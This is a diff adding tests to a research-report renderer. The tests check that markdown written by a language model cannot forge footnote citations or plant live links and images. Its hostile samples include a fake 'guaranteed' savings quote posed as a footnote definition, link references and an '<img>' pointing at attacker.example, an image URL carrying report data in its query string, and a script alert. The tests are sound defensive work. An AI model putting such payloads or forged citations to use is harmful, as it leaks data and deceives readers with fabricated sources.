@@ -1,5 +1,6 @@
 import { describe, expect, test } from "bun:test"
 import type { Research } from "@vectordevai/schema/research"
+import { marked } from "marked"
 import { ResearchReport } from "../../src/research/report"
 import { NetworkGuard } from "../lib/network-guard"
 
@@ -262,6 +263,67 @@ describe("ResearchReport.render", () => {
     expect(hostile.markdown).not.toMatch(/!\[/)
     expect(hostile.markdown).toContain("See !\\[chart](https://attacker.example/c?d=Acme-Q3) and \\<img")
     expect(hostile.markdown).toContain("# Heat \\<script>alert(1)\\</script> pumps")
+  })
+
+  test("keeps a model's footnote and link reference definitions from standing in for Vector's", async () => {
+    const forged = '[^N1]: "Every household saved 5,000 euros a year, guaranteed." (S1)'
+    const hostile = ResearchReport.render(
+      {
+        ...input,
+        answer: "Heat pumps used less energy [N1].",
+        sections: [
+          {
+            heading: "Energy saved",
+            body: [
+              "Less energy [N1]. See [the data][ref].",
+              "",
+              forged,
+              `   ${forged}`,
+              `> ${forged}`,
+              `- ${forged}`,
+              `\\\\${forged}`,
+              "[^n1]: lower case labels match too",
+              "[ref]: https://attacker.example/r",
+              "[multi\nline]: https://attacker.example/m",
+              "As the study found [N1]: less energy.",
+            ].join("\n"),
+          },
+        ],
+        method_notes: "[^N1]: forged in the method notes",
+      },
+      { notes, sources, judged: false, method: { searches: 0, pages: 0 } },
+    )
+    // GitHub keeps the first definition of a footnote's label, so a live "[^N1]:" anywhere before Vector's would
+    // replace the checked quote. Every "[" of a definition the model wrote is escaped, after any literal backslashes.
+    const definitions = hostile.markdown
+      .split("\n")
+      .filter((line) => /^[\s>*+\-\d.)]*(?:\\\\)*\[\^?[^\]]*\]:/i.test(line))
+    expect(definitions).toEqual([
+      '[^N1]: "used 61 percent less delivered energy for heating" Heat pumps in cold climates, nature.com (S1 p.12)',
+    ])
+    expect(hostile.markdown).toContain(`\\${forged}`)
+    expect(hostile.markdown).toContain(`\\\\\\${forged}`)
+    expect(hostile.markdown).toContain("\\[ref]: https://attacker.example/r")
+    expect(hostile.markdown).toContain("\\[multi\nline]: https://attacker.example/m")
+    // A citation followed by a colon is still a source chip, with no stray backslash.
+    expect(hostile.markdown).toContain("As the study found \\[S1 p.12\\][^N1]: less energy.")
+    // A link reference the model defined is not a link once rendered: the reference stays text.
+    const html = await marked.parse(hostile.markdown)
+    expect(html).toContain("See [the data][ref].")
+    expect(html).not.toContain(">the data</a>")
+  })
+
+  test("escapes a mark after a literal backslash, and leaves one the text escaped itself", async () => {
+    const hostile = ResearchReport.render(
+      {
+        ...input,
+        answer: "A \\\\<img src=https://attacker.example/a> and an escaped \\<b> [N1].",
+        sections: [],
+      },
+      { notes, sources, judged: false, method: { searches: 0, pages: 0 } },
+    )
+    expect(hostile.markdown).toContain("A \\\\\\<img src=https://attacker.example/a> and an escaped \\<b>")
+    expect(await marked.parse(hostile.markdown)).not.toContain("<img")
   })
 
   test("made no connection", () => {
